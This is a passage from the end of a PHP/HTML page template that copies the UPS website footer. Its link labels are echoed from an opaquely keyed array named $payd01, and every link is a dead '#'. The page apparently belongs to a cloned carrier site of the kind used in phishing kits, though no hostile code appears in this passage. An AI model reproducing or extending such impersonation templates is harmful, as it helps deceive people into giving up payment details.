                                    <button class="ups-med_show" aria-labelledby="ups-footer_legal2" aria-expanded="false" aria-controls="ups-footer_legalLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
                                 </div>
                                 <ul class="ups-footer_expand" aria-labelledby="ups-footer_legal" id="ups-footer_legalLinks" aria-hidden="true">
                                    <li><a href="#" class="ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x047']?><span class="" aria-hidden="true"></span></a></li>
                                    <li><a href="#" class="ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x048']?><span class="" aria-hidden="true"></span></a></li>
                                    <li><a href="#" class="ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x049']?><span class="" aria-hidden="true"></span></a></li>
                                    <li><a href="#" class="ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x050']?><span class="" aria-hidden="true"></span></a></li>
                                    <li><a href="#" target="_blank" rel="noopener noreferrer" class="ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x051']?><span class="" aria-hidden="true"></span>
                                       <span class="icon ups-link_newwindow" aria-hidden="true"></span>
                                       <span class="ups-readerTxt">Open the link in a new window</span></a>
                                    </li>
                                    <li><a href="#" role="button" class="ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x052']?><span class="" aria-hidden="true"></span></a></li>
                                 </ul>
                                 <br>
                                 <p class="ups-footer_disclaimer"><?php echo $payd01['x053']?></p>
                              </div>
                           </div>
                        </div>
                     </footer>
                  </div>
               </div>
               <div class="iw_placeholder" id="iw_placeholder1510655492385">
                  <div class="iw_component" id="iw_comp1510655492395"> 
                  </div>
               </div>
            </div>
         </div>
      </div>
      <noscript>
</html>
